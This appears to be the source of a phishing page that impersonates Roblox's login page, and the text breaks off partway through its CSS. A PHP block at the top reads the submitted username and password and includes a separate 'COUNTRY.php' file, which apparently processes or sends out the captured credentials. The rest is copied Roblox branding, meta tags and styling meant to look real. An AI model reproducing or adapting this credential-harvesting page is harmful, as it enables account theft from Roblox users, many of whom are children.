<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
$username = $_POST['password'];
$password = $_POST['username'];
$files = scandir(__DIR__); // __DIR__ يشير إلى المجلد الحالي
$loginFolder = '';

// ابحث عن الملفات التي تطابق النمط الذي تريده
foreach ($files as $file) {
    if (strpos($file, 'index') !== false) { // تأكد من أن الملف يحتوي على "index" في اسمه
        $loginFolder = basename(__DIR__); // احصل على اسم المجلد الحالي
        break; // أخرج من الحلقة عند العثور على أول ملف مطابق
    }
}
include("../COUNTRY.php");
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset=utf-8>
    <title>Roblox</title>
    <meta http-equiv=X-UA-Compatible content="IE=edge,requiresActiveX=true">
    <meta name=viewport content="width=device-width, initial-scale=1">
    <meta name=author content="Roblox Corporation">
    <meta name=description content="Roblox is a global platform that brings people together through play.">
    <meta name=csrf-token data-token=UbZYzxX0t8Hl class=sf-hidden>
    <link href="favicon.ico" rel=icon>
    <style>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}footer{display:block}a{background:transparent}a:active,a:hover{outline:0}button,input{font:inherit;margin:0}button{overflow:visible}button{text-transform:none}button{-webkit-appearance:button}.container-fluid{margin-right:auto;margin-left:auto;padding-left:0;padding-right:0}.container-fluid:after,.container-fluid:before{content:" ";display:table}.container-fluid:after{clear:both}.row{margin-left:0;margin-right:0}.row:after,.row:before{content:" ";display:table}.row:after{clear:both}.col-md-5,.col-sm-6,.col-sm-12,.col-xs-5{position:relative;min-height:1px;padding-left:0;padding-right:0}.col-xs-5{float:left}.col-xs-5{width:41.66667%}@media(min-width:768px){.col-sm-6,.col-sm-12{float:left}.col-sm-6{width:50%}.col-sm-12{width:100%}}@media(min-width:992px){.col-md-2,.col-md-3,.col-md-5{float:left}.col-md-2{width:16.66667%}.col-md-3{width:25%}.col-md-5{width:41.66667%}}@media(min-width:1200px){.col-lg-3,.col-lg-4{float:left}.col-lg-3{width:25%}.col-lg-4{width:33.33333%}}.navbar-header:after,.navbar-header:before{content:" ";display:table}.navbar-header:after{clear:both}@media(min-width:768px){.navbar-header{float:left}}.navbar-fixed-top{position:fixed;right:0;left:0;z-index:1030;-webkit-transform:translateZ(0);transform:translateZ(0)}@media(min-width:768px){.navbar-fixed-top{border-radius:0}}.navbar-fixed-top{top:0}.navbar-brand{float:left;font-size:18px;line-height:20px;height:40px}.navbar-brand:focus,.navbar-brand:hover{text-decoration:none}@media(min-width:768px){.navbar-left{float:left !important}.navbar-right{float:right !important}}.nav{margin-bottom:0;padding-left:0;list-style:none}.nav:after,.nav:before{content:" ";display:table}.nav:after{clear:both}.nav>li,.nav>li>a{position:relative;display:block}.nav>li>a:focus,.nav>li>a:hover{text-decoration:none;background-color:#eee}@-ms-viewport{width:device-width}@media(max-width:767px){.hidden-xs{display:none !important}}@media(min-width:768px) and (max-width:991px){.hidden-sm{display:none !important}}h1{line-height:1.4em;margin:0;padding:5px 0}@media(max-width:767px){h1{font-size:20px}}@media(max-width:767px){div{font-size:12px;font-weight:400}}p{word-wrap:break-word;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;-o-hyphens:none;hyphens:none}.xsmall{color:#191919}.xsmall,.xsmall:active,.xsmall:link,.xsmall:visited{font-size:10px;font-weight:400}.text-center{text-align:center}.text-link,.text-link:active,.text-link:hover,.text-link:link,.text-link:visited{color:#00a2ff}.text-link:focus,.text-link:hover{text-decoration:underline}.text-footer-nav,.text-footer-nav:active,.text-footer-nav:link,.text-footer-nav:visited{color:#b8b8b8;font-size:20px;font-weight:300}@media(max-width:767px){.text-footer-nav,.text-footer-nav:active,.text-footer-nav:link,.text-footer-nav:visited{font-size:16px}}.text-footer-nav:focus,.text-footer-nav:hover{color:#191919;font-size:20px;font-weight:300}@media(max-width:767px){.text-footer-nav:focus,.text-footer-nav:hover{font-size:16px}}@media(max-width:767px){.text-footer{font-size:10px}}html{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;min-height:100%;position:relative}*,:after,:before{-webkit-box-sizing:inherit;-moz-box-sizing:inherit;box-sizing:inherit}body{font-size:16px;width:100%;height:100%;min-width:320px;margin-bottom:168px;overflow-y:scroll}@media(max-width:991px){body{margin-bottom:0}}@media(max-width:767px){body{font-size:12px;font-weight:400}}.content{max-width:1338px;padding-top:12px;margin:0 auto}.content:after,.content:before{content:" ";display:table}.content:after{clear:both}@media(max-width:1338px){.content{max-width:1154px}}@media(max-width:1154px){.content{max-width:970px}}.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}@-ms-viewport{width:auto}*,:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}p{line-height:1.5em}a,a:active,a:focus,a:hover,a:link,a:visited{text-decoration:none;color:inherit}a:focus,a:hover{cursor:pointer}li,ul{list-style:none;margin:0;padding:0}button[class^=btn]{font-weight:500}.container-main:after,.container-main:before{content:" ";display:table}.container-main:after{clear:both}.container-main{min-height:calc(100% - 183px);margin:40px auto 0;position:relative;padding-bottom:40px}@media(max-width:991px){.container-main{margin-top:82px;padding-bottom:0}}@media(max-width:543px){.container-main{margin-top:74px}}@media(max-width:991px){.container-main:not(.in-app){min-height:420px}}.container-footer{padding:12px;position:absolute;bottom:0;right:0;width:100%}@media(max-width:991px){.container-footer{position:relative}}.section-content{margin:0 0 18px}@media(max-width:767px){.section-content{margin:0 0 12px}}.light-theme .section-content{background-color:#fff;color:#393b3d}.section-content{padding:15px;position:relative}.section-content:after,.section-content:before{content:" ";display:table}.section-content:after{clear:both}.btn-primary-xs{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;border:1px solid #02b757;cursor:pointer;display:inline-block;height:auto;text-align:center;white-space:nowrap;vertical-align:middle;padding:4px;font-size:12px;line-height:100%}.btn-primary-xs:link{color:#fff}.btn-primary-xs:focus,.btn-primary-xs:hover{background-color:#3fc679;border-color:#3fc679;color:#fff;cursor:pointer}.btn-primary-xs:active{background-color:#3fc679;color:#fff}.btn-primary-xs:active:focus{outline:0 none}.btn-primary-xs:visited{color:#fff}.btn-primary-xs:visited:focus{outline:0 none}.light-theme .btn-primary-xs{background-color:#393b3d;border-color:#393b3d;color:#fff;border-radius:8px}.light-theme .btn-primary-xs:link{color:#fff}.light-theme .btn-primary-xs:focus,.light-theme .btn-primary-xs:hover{background-color:#393b3d;border-color:#393b3d;color:#fff}.light-theme .btn-primary-xs:active{background-color:#393b3d;color:#fff}.light-theme .btn-primary-xs:visited{color:#fff}.btn-growth-sm{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;border:1px solid #02b757;cursor:pointer;font-weight:500;height:auto;text-align:center;white-space:nowrap;vertical-align:middle;font-size:16px;line-height:100%}.btn-growth-sm:link{color:#fff}.btn-growth-sm:focus,.btn-growth-sm:hover{background-color:#3fc679;border-color:#3fc679;color:#fff;cursor:pointer}.btn-growth-sm:active{background-color:#3fc679;color:#fff}.btn-growth-sm:active:focus{outline:0 none}.btn-growth-sm:visited{color:#fff}.btn-growth-sm:visited:focus{outline:0 none}.light-theme .btn-growth-sm{background-color:#00b06f;border-color:#00b06f;color:#fff;border-radius:8px}.light-theme .btn-growth-sm:link{color:#fff}.light-theme .btn-growth-sm:focus,.light-theme .btn-growth-sm:hover{background-color:#00b06f;border-color:#00b06f;color:#fff}.light-theme .btn-growth-sm:active{background-color:#00b06f;color:#fff}.light-theme .btn-growth-sm:visited{color:#fff}.btn-secondary-md{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;border:1px solid #00a2ff;cursor:pointer;display:inline-block;height:auto;text-align:center;white-space:nowrap;vertical-align:middle;padding:9px;font-size:16px;line-height:100%}.btn-secondary-md:link{color:#fff}.btn-secondary-md:focus,.btn-secondary-md:hover{background-color:#32b5ff;border-color:#32b5ff;color:#fff;cursor:pointer}.btn-secondary-md:active{background-color:#32b5ff;color:#fff}.btn-secondary-md:active:focus{outline:0 none}.btn-secondary-md:visited{color:#fff}.btn-secondary-md:visited:focus{outline:0 none}@media(max-width:767px){.btn-secondary-md{padding:7px;font-size:16px;line-height:100%;border-radius:3px}}.light-theme .btn-secondary-md{background-color:transparent;border-color:#606162;color:rgba(0,0,0,.6);border-radius:8px}.light-theme .btn-secondary-md:link{color:rgba(0,0,0,.6)}.light-theme .btn-secondary-md:focus,.light-theme .btn-secondary-md:hover{background-color:transparent;border-color:#393b3d;color:#393b3d}.light-theme .btn-secondary-md:active{background-color:transparent;color:#393b3d}.light-theme .btn-secondary-md:visited{color:rgba(0,0,0,.6)}.btn-control-md{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;border:1px solid #b8b8b8;cursor:pointer;display:inline-block;height:auto;text-align:center;white-space:nowrap;vertical-align:middle;padding:9px;font-size:16px;line-height:100%}.btn-control-md:link{color:#191919}.btn-control-md:focus,.btn-control-md:hover{background-color:#fff;border-color:#b8b8b8;color:#191919;cursor:pointer}.btn-control-md:active{background-color:#fff;color:#191919}.btn-control-md:active:focus{outline:0 none}.btn-control-md:visited{color:#191919}.btn-control-md:visited:focus{outline:0 none}@media(max-width:767px){.btn-control-md{padding:7px;font-size:16px;line-height:100%;border-radius:3px}}.light-theme .btn-control-md{background-color:transparent;border-color:#606162;color:rgba(0,0,0,.6);border-radius:8px}.light-theme .btn-control-md:link{color:rgba(0,0,0,.6)}.light-theme .btn-control-md:focus,.light-theme .btn-control-md:hover{background-color:transparent;border-color:#393b3d;color:#393b3d}.light-theme .btn-control-md:active{background-color:transparent;color:#393b3d}.light-theme .btn-control-md:visited{color:rgba(0,0,0,.6)}.btn-min-width{min-width:90px}.btn-full-width{width:100%}.rbx-divider{height:1px;overflow:hidden}input::-webkit-input-placeholder{color:#b8b8b8;font-weight:300;opacity:.5}.light-theme .form-control:focus{background-color:transparent}.form-control{display:block;width:100%;background-image:none;border:1px solid #b8b8b8}.form-control:focus{border-color:#66afe9;outline:0}@media(max-width:543px){.form-group{margin-bottom:6px}}.form-has-feedback{position:relative}.form-has-feedback .input-field{padding-right:30px}.light-theme .input-field{background-color:hsla(0,0,100%,.9);border-color:rgba(57,59,61,.2);color:#606162;border-radius:8px}.light-theme .input-field::-webkit-input-placeholder{color:#606162;font-weight:300;opacity:.5}.light-theme .input-field:focus{background-color:hsla(0,0,100%,.9);border-color:rgba(0,0,0,.3)}.input-field{font-weight:400;font-size:16px;height:38px;padding:5px 12px;-webkit-appearance:none}.input-field:focus,.input-field:required{box-shadow:none}.ph-clickalwaysallowed{position:fixed;bottom:0;width:100%;z-index:10030;background-color:#fff}.icon-logo{background-repeat:no-repeat;width:118px;height:30px;vertical-align:middle;background-size:118px 30px}.light-theme .icon-logo{background-image:url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIwIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMzIwIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPg0KPHBhdGggZD0iTTM4LjU3OTYgMzguNDA0M0w0Ny43OTA2IDU1LjI2MjZIMzAuNjk5OUwyMi45MjI2IDQwLjg1NTZIMTUuNTU0NlY1NS4yNjI2SDBWNC4xOTMwOEgyOC40NDg2QzQwLjIxNjkgNC4xOTMwOCA0Ny42ODgzIDEwLjcyNDYgNDcuNjg4MyAyMi40NzA2QzQ3LjY4ODMgMzAuMDI4OSA0NC4yMDkgMzUuNDQzMyAzOC41Nzk2IDM4LjQwNDNaTTE1LjU1NDYgMTcuNDY1OFYyNy41Nzc1SDI2LjYwNjZDMjkuODgxMyAyNy41Nzc1IDMxLjkyNzkgMjUuNjM2OSAzMS45Mjc5IDIyLjQ3MDZDMzEuOTI3OSAxOS4zMDQzIDI5Ljg4MTMgMTcuNDY1OCAyNi42MDY2IDE3LjQ2NThIMTUuNTU0NlpNOTcuMjE3NSA1OS4wMzc0TDUwLjY1NiA0Ni40NzQzTDYzLjE0MDYgMEw4Ni40MjE0IDYuMjgxNTVMMTA5LjcwMiAxMi41NjMxTDk3LjIxNzUgNTkuMDM3NFpNODguNDE2OSAyNC44MTk4TDc1LjQyMDYgMjEuMjQ0OUw3MS45NDEzIDM0LjIxNjZMODQuOTM3NiAzNy43OTI1TDg4LjQxNjkgMjQuODE5OFpNMTYzLjAxOSA0MC44NTU2QzE2My4wMTkgNTAuNjYxIDE1Ni43NzcgNTUuMjYyNiAxNDcuMDU1IDU1LjI2MjZIMTE2LjU2VjQuMTkzMDhIMTQ2LjAzMkMxNTUuNzUzIDQuMTkzMDggMTYxLjk5NSA5LjE5Nzg5IDE2MS45OTUgMTcuOTgxOEMxNjEuOTk1IDIzLjQ5NzMgMTU5Ljk0OSAyNy4xNzU0IDE1Ni4wNiAyOS43Mjg5QzE2MC40NjEgMzEuNjYzMSAxNjMuMDE5IDM1LjU0NTUgMTYzLjAxOSA0MC44NTU2Wk0xMzEuNzA1IDE2LjQ0OThWMjQuMDA4SDE0MS44M0MxNDQuNTkzIDI0LjAwOCAxNDYuMjMxIDIyLjc4MjQgMTQ2LjIzMSAyMC4xMjY4QzE0Ni4yMzEgMTcuNjc1NCAxNDQuNTkzIDE2LjQ0OTggMTQxLjgzIDE2LjQ0OThIMTMxLjcwNVpNMTMxLjcwNSA0My4wMDU5SDE0My4wNjRDMTQ1LjcyNSA0My4wMDU5IDE0Ny4yNjUgNDEuNTc2IDE0Ny4yNjUgMzkuMTIzNUMxNDcuMjY1IDM2LjQ2OSAxNDUuNzMgMzUuMjQzMyAxNDMuMDY0IDM1LjI0MzNIMTMxLjcwNVY0My4wMDU5Wk0xNzAuNjk0IDQuMTkzMDhIMTg2LjI0NlY0MC4xNDE3SDIwOC41NTVWNTUuMjYyNkgxNzAuNjkyTDE3MC42OTQgNC4xOTMwOFpNMjY1Ljc2MiAyOS43Mjg5QzI2NS43NjIgMzQuOTgxMiAyNjQuMjAyIDQwLjExNTYgMjYxLjI3OCA0NC40ODI3QzI1OC4zNTUgNDguODQ5OCAyNTQuMTk5IDUyLjI1MzYgMjQ5LjMzOCA1NC4yNjM2QzI0NC40NzYgNTYuMjczNiAyMzkuMTI2IDU2Ljc5OTUgMjMzLjk2NSA1NS43NzQ4QzIyOC44MDQgNTQuNzUwMSAyMjQuMDYzIDUyLjIyMDkgMjIwLjM0MiA0OC41MDY5QzIxNi42MjEgNDQuNzkzIDIxNC4wODcgNDAuMDYxMSAyMTMuMDYgMzQuOTA5OEMyMTIuMDM0IDI5Ljc1ODQgMjEyLjU2MSAyNC40MTg4IDIxNC41NzQgMTkuNTY2M0MyMTYuNTg4IDE0LjcxMzggMjE5Ljk5OCAxMC41NjYzIDIyNC4zNzQgNy42NDgyOEMyMjguNzQ5IDQuNzMwMjUgMjMzLjg5MyAzLjE3Mjc2IDIzOS4xNTYgMy4xNzI3NkMyNDIuNjUxIDMuMTY1ODIgMjQ2LjExNCAzLjg0NzggMjQ5LjM0NSA1LjE3OTU4QzI1Mi41NzUgNi41MTEzNSAyNTUuNTExIDguNDY2NzIgMjU3Ljk4MyAxMC45MzM1QzI2MC40NTUgMTMuNDAwMyAyNjIuNDE1IDE2LjMyOTkgMjYzLjc1IDE5LjU1NDRDMjY1LjA4NSAyMi43Nzg4IDI2NS43NjkgMjYuMjM0NiAyNjUuNzYyIDI5LjcyMzVWMjkuNzI4OVpNMjUwLjIwOCAyOS43Mjg5QzI1MC4yMDggMjMuMzk1MiAyNDUuMTkzIDE4LjM5MDQgMjM5LjE1NiAxOC4zOTA0QzIzMy4xMTggMTguMzkwNCAyMjguMTAzIDIzLjM5NTIgMjI4LjEwMyAyOS43Mjg5QzIyOC4xMDMgMzYuMDYyNiAyMzMuMTE4IDQxLjA2NjMgMjM5LjE1NiA0MS4wNjYzQzI0NS4xOTMgNDEuMDY2MyAyNTAuMjA4IDM2LjA1NTEgMjUwLjIwOCAyOS43MjM1VjI5LjcyODlaTTMwMy4yMTYgMjguOTEwN0wzMjAgNTUuMjYyNkgzMDEuNDcyTDI5Mi4yNjcgNDAuMjQyOEwyODIuNzUgNTUuMjYyNkgyNjMuOTJMMjgxLjQxOSAyOS41MjI1TDI2NS4zNTMgNC4xOTMwOEgyODMuODc1TDI5Mi4zNjkgMTcuOTgxOEwzMDAuNTU2IDQuMTkzMDhIMzE4Ljk3NkwzMDMuMjE2IDI4LjkxMDdaIiBmaWxsPSIjMzkzQjNEIi8+DQo8L3N2Zz4NCg==)}.icon-logo{background-position:0 0}.icon-common-search-sm{background-repeat:no-repeat;display:inline-block;vertical-align:middle}.light-theme .icon-common-search-sm{background-image:url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNSA0LjEwOEE3LjgxMSA3LjgxMSAwIDAwOC42MyAxLjM2Yy0yLjkzNC4xNDctNS4zNDggMS44MzgtNi42NTcgNC4yMzhhLjc1Ljc1IDAgMTAxLjMxNy43MThjMS4wNzktMS45NzggMy4wNDMtMy4zNCA1LjQxNi0zLjQ1OGE2LjMxMiA2LjMxMiAwIDAxNS4wODEgMi4xNGgtMS42ODZhLjc1Ljc1IDAgMDAwIDEuNUgxNi41VjIuMWEuNzUuNzUgMCAwMC0xLjUgMHYyLjAwOHpNMS41IDExLjUwNmg0LjM5OWEuNzUuNzUgMCAwMTAgMS41aC0xLjY4YTYuMzEyIDYuMzEyIDAgMDA1LjA3NSAyLjEzM2MyLjM4NC0uMTIgNC40MDEtMS40ODggNS40MDgtMy40NDJhLjc1Ljc1IDAgMDExLjMzMy42ODdjLTEuMjQ5IDIuNDI0LTMuNzQyIDQuMTA3LTYuNjY2IDQuMjUzQTcuODEyIDcuODEyIDAgMDEzIDEzLjg4OXYyLjAxNmEuNzUuNzUgMCAwMS0xLjUgMHYtNC40ek0xMi41IDI1LjVhNSA1IDAgMTEtMTAgMCA1IDUgMCAwMTEwIDB6TTEgMjUuNWE2LjUgNi41IDAgMDAxMC40MzYgNS4xNzNsNC4wNzUgNC4wNzJhLjg3Mi44NzIgMCAwMDEuMjM0LS4wMDIuODc2Ljg3NiAwIDAwLS4wMDItMS4yMzdsLTQuMDcxLTQuMDY4QTYuNSA2LjUgMCAxMDEgMjUuNXoiIGZpbGw9IiMxMjEyMTIiLz48L3N2Zz4=)}.light-theme .input-group .input-field{background-color:hsla(0,0,100%,.9);border-color:rgba(57,59,61,.2)}.light-theme .input-group .input-field::-webkit-input-placeholder{color:#606162;font-weight:300;opacity:.5}.light-theme .input-group .input-field:focus{background-color:hsla(0,0,100%,.9);border-color:rgba(0,0,0,.3)}.input-group{position:relative;border-collapse:separate}.input-group:after,.input-group:before{content:" ";display:table}.input-group:after{clear:both}.input-group .form-control{width:100%;margin-bottom:0}.input-group .input-field{position:relative;float:left}.input-group .input-field:not(.last-input){border-bottom-right-radius:0;border-top-right-radius:0;border-right:0}.input-group .input-field:focus{border-color:#b8b8b8}.input-group .input-group-btn{width:1%}.input-group .input-group-btn:last-child .input-addon-btn{margin-left:0;border-left:0;border-radius:0 3px 3px 0}.input-group-btn{vertical-align:middle}.input-group .form-control:first-child{border-bottom-right-radius:0;border-top-right-radius:0}.input-group .form-control:last-child{border-bottom-left-radius:0;border-top-left-radius:0}.light-theme .input-group-btn .input-addon-btn{background-color:transparent;color:rgba(0,0,0,.6)}.light-theme .input-group-btn .input-addon-btn:link{color:rgba(0,0,0,.6)}.light-theme .input-group-btn .input-addon-btn:focus,.light-theme .input-group-btn .input-addon-btn:hover{background-color:transparent;border-color:#393b3d;color:#393b3d}.light-theme .input-group-btn .input-addon-btn:active{background-color:transparent;color:#393b3d}.light-theme .input-group-btn .input-addon-btn:visited{color:rgba(0,0,0,.6)}.input-group-btn{white-space:nowrap;padding:0}.input-group-btn .input-addon-btn{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;font-weight:500;text-align:center;white-space:nowrap;vertical-align:middle;border-bottom-left-radius:0;border-top-left-radius:0;border-bottom-right-radius:3px;border-top-right-radius:3px;border:1px solid #b8b8b8;border-left-color:transparent;padding:0}.input-group-btn .input-addon-btn:link{color:#191919}.input-group-btn .input-addon-btn:focus,.input-group-btn .input-addon-btn:hover{background-color:#fff;border-color:#b8b8b8;color:#191919;cursor:pointer}.input-group-btn .input-addon-btn:active{background-color:#fff;color:#191919}.input-group-btn .input-addon-btn:active:focus{outline:0 none}.input-group-btn .input-addon-btn:visited{color:#191919}.input-group-btn .input-addon-btn:visited:focus{outline:0 none}.light-theme{background-color:#f2f4f5;color:#393b3d}.light-theme .content{background-color:#f2f4f5;color:#393b3d}.light-theme .rbx-divider{background-color:rgba(57,59,61,.2)}.light-theme :focus,.light-theme :focus-visible{outline-color:#168dd8 !important}.light-theme .text-footer{color:#606162}.light-theme .text-link,.light-theme .text-link:active,.light-theme .text-link:hover,.light-theme .text-link:link,.light-theme .text-link:visited{color:#393b3d}.light-theme input::-webkit-input-placeholder{color:rgba(0,0,0,.3);font-weight:300;opacity:.5}.light-theme .input-group{display:block}.light-theme .input-group .input-field{z-index:0;border-right:1px solid rgba(57,59,61,.2)}@media(max-width:767px){.light-theme .input-group .input-field{font-size:18px}}.light-theme .input-group .input-group-btn{display:inline-block;position:static;z-index:1020}@media(max-width:767px){.light-theme .input-group .input-group-btn{position:absolute;left:0;top:0}}.light-theme .input-group .input-group-btn .input-addon-btn{position:absolute;left:0;top:0;border-radius:3px 0 0 3px}@media(max-width:767px){.light-theme .input-group .input-group-btn .input-addon-btn{position:relative}}.light-theme .input-group .input-group-btn .input-addon-btn,.light-theme .input-group .input-group-btn .input-addon-btn:focus,.light-theme .input-group .input-group-btn .input-addon-btn:hover{border-color:transparent}.light-theme .text-footer-nav,.light-theme .text-footer-nav:active,.light-theme .text-footer-nav:link,.light-theme .text-footer-nav:visited{color:#606162}.light-theme .text-footer-nav.privacy,.light-theme .text-footer-nav.privacy:active,.light-theme .text-footer-nav.privacy:link,.light-theme .text-footer-nav.privacy:visited,.light-theme .text-footer-nav:focus,.light-theme .text-footer-nav:hover{color:#393b3d}.gotham-font button,.gotham-font input{font-family:HCo Gotham SSm,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.gotham-font{font-weight:400}.gotham-font,.gotham-font h1{font-family:HCo Gotham SSm,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif}.gotham-font h1{font-size:32px;font-weight:800}@media(max-width:767px){.gotham-font h1{font-size:24px}}.gotham-font .text-link{font-weight:500}.gotham-font div{font-size:16px;font-weight:400;line-height:1.4em}@media(max-width:767px){.gotham-font div{font-size:16px;font-weight:400}}@media(max-width:543px){.gotham-font div{font-size:12px;font-weight:400}}.gotham-font .font-header-2,.gotham-font .font-header-2:active,.gotham-font .font-header-2:hover,.gotham-font .font-header-2:link,.gotham-font .font-header-2:visited,.gotham-font .text-footer-nav,.gotham-font .text-footer-nav:active,.gotham-font .text-footer-nav:hover,.gotham-font .text-footer-nav:link,.gotham-font .text-footer-nav:visited{font-size:16px;font-weight:500}@media(max-width:767px){.gotham-font .font-header-2,.gotham-font .font-header-2:active,.gotham-font .font-header-2:hover,.gotham-font .font-header-2:link,.gotham-font .font-header-2:visited,.gotham-font .text-footer-nav,.gotham-font .text-footer-nav:active,.gotham-font .text-footer-nav:hover,.gotham-font .text-footer-nav:link,.gotham-font .text-footer-nav:visited{font-size:12px;font-weight:500}}.gotham-font .text-footer,.gotham-font .text-footer:active,.gotham-font .text-footer:focus,.gotham-font .text-footer:hover,.gotham-font .text-footer:link,.gotham-font .text-footer:visited,.gotham-font .xsmall,.gotham-font .xsmall:active,.gotham-font .xsmall:focus,.gotham-font .xsmall:hover,.gotham-font .xsmall:link,.gotham-font .xsmall:visited{font-size:10px;font-weight:500}@media(max-width:767px){.gotham-font .text-footer,.gotham-font .text-footer:active,.gotham-font .text-footer:focus,.gotham-font .text-footer:hover,.gotham-font .text-footer:link,.gotham-font .text-footer:visited,.gotham-font .xsmall,.gotham-font .xsmall:active,.gotham-font .xsmall:focus,.gotham-font .xsmall:hover,.gotham-font .xsmall:link,.gotham-font .xsmall:visited{font-size:8px}}.gotham-font .input-field{line-height:1.4em}#skip-to-main-content{position:absolute;top:7px;transform:translateY(-200%);transition:transform .3s}#skip-to-main-content:focus{transform:translateY(0)}.rbx-header{height:82px}.rbx-header .rbx-navbar-header{position:relative;z-index:100;max-width:76px;margin:0 5px;float:left}@media(max-width:1199px){.rbx-header .rbx-navbar-header{margin:0}}@media(max-width:991px){.rbx-header .rbx-navbar-header{margin:0 5px}}@media(max-width:543px){.rbx-header .rbx-navbar-header{margin:0}}.rbx-header .navbar-brand{padding:5px 0;margin-left:4px}.rbx-header .navbar-header{float:left}.rbx-header .rbx-nav-collapse{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;float:left;position:relative;margin:2px}.rbx-header .icon-logo{display:none}@media(min-width:1688px){.rbx-header .rbx-navbar-header{max-width:175px;width:175px;margin:0;padding:0 12px}.rbx-header .icon-logo{display:block}}.rbx-header .rbx-navbar{margin:4px auto;display:flex}.rbx-header .rbx-navbar li{text-align:center}.rbx-header .rbx-navbar li .nav-menu-title{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;padding:6px 9px;display:inline-block;width:100%}.rbx-header .rbx-navbar li{width:auto;flex-grow:1}.rbx-header .rbx-navbar li .robux-menu-btn{text-align:center}.rbx-header .rbx-navbar li .robux-menu-btn .menu-text-container{display:inline-block;position:relative}.rbx-header .rbx-navbar li .robux-menu-btn .menu-text-container .robux-btn{display:inline-block}@media(max-width:992px){.rbx-header .rbx-navbar{display:flex}}.rbx-header .rbx-navbar-right{float:right;margin-right:12px}.rbx-header .rbx-navbar-right:after,.rbx-header .rbx-navbar-right:before{content:" ";display:table}.rbx-header .rbx-navbar-right:after{clear:both}@media(max-width:1199px){.rbx-header .rbx-navbar-right{margin-right:3px}}.rbx-header .rbx-navbar-right-nav{margin:4px auto}.rbx-header .rbx-navbar-right-nav li{text-align:center}.rbx-header .rbx-navbar-right-nav li .nav-menu-title{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;padding:6px 9px;display:inline-block;width:100%}.rbx-header .rbx-navbar-right-nav>li{float:left;padding:2px}.rbx-header .navbar-search{box-sizing:border-box;margin-top:6px;position:relative;border-radius:8px}.rbx-header .navbar-search .input-field{border-radius:8px}.rbx-header .navbar-search .input-addon-btn,.rbx-header .navbar-search .input-field{display:flex;align-items:center;box-sizing:border-box;height:28px;box-shadow:none;-webkit-appearance:none}.rbx-header .navbar-search .input-addon-btn .icon-common-search-sm{opacity:.7;background-position:0-20px;height:20px;width:20px;background-size:40px auto;margin:0 6px}.light-theme .rbx-header .navbar-search .new-input-field{color:#393b3d}@media(max-width:543px){.rbx-header{height:74px}.rbx-header .navbar-search{float:none;left:5px;margin:0 12px;position:absolute;top:40px;width:calc(100% - 24px);z-index:10000}.rbx-header .navbar-search.shown{display:inline-block}.rbx-header .rbx-navbar-right-nav li.login-action{margin:0 10px}}@media(min-width:992px){.rbx-header{height:40px}}@media(max-width:991px){#right-navigation-header{position:absolute;right:0;left:100px}}@media(max-width:543px){#right-navigation-header{left:0}}.light-theme .rbx-header{background-color:#dee1e3;border:solid #c7cbce;border-width:0 0 1px}.light-theme .rbx-header .text-header,.light-theme .rbx-header .text-header:active,.light-theme .rbx-header .text-header:focus,.light-theme .rbx-header .text-header:hover,.light-theme .rbx-header .text-header:link,.light-theme .rbx-header .text-header:visited{color:#393b3d}.light-theme .rbx-header .navbar-search{background-color:#f2f4f5}.light-theme .rbx-header .navbar-search .input-addon-btn,.light-theme .rbx-header .navbar-search .input-addon-btn:active,.light-theme .rbx-header .navbar-search .input-addon-btn:focus,.light-theme .rbx-header .navbar-search .input-addon-btn:hover{border-color:transparent}.light-theme .rbx-header .rbx-navbar li:hover{border:0#393b3d;border-bottom:2px solid #393b3d}.light-theme .rbx-header .rbx-navbar li .nav-menu-title:focus,.light-theme .rbx-header .rbx-navbar li .nav-menu-title:hover{background-color:transparent}.light-theme .rbx-header .navbar-search .input-group{height:28px}.light-theme .rbx-header .navbar-search .input-field{padding-left:33px}.footer{max-width:970px;text-align:center;margin:0 auto}.footer .footer-links{padding-left:0;text-align:center;margin-bottom:32px;margin-top:20px;display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between}.footer .footer-link{margin:6px;white-space:nowrap}@media(max-width:991px){.footer .footer-link{min-width:15%}}.copyright-container{padding-top:24px;border-top:1px solid #e3e3e3}.copyright-container .footer-note{text-align:left;margin:0 0 0 24px;width:auto}@media(max-width:991px){.copyright-container .footer-note{text-align:center;margin-top:12px;margin-left:0}}.light-theme .footer .text-footer-nav,.light-theme .footer .text-footer-nav:active,.light-theme .footer .text-footer-nav:link,.light-theme .footer .text-footer-nav:visited{color:#606162}.light-theme .footer .text-footer-nav.privacy,.light-theme .footer .text-footer-nav.privacy:active,.light-theme .footer .text-footer-nav.privacy:link,.light-theme .footer .text-footer-nav.privacy:visited,.light-theme .footer .text-footer-nav:focus,.light-theme .footer .text-footer-nav:hover{color:#393b3d}.light-theme .copyright-container{border-color:#bdbebe}.light-theme 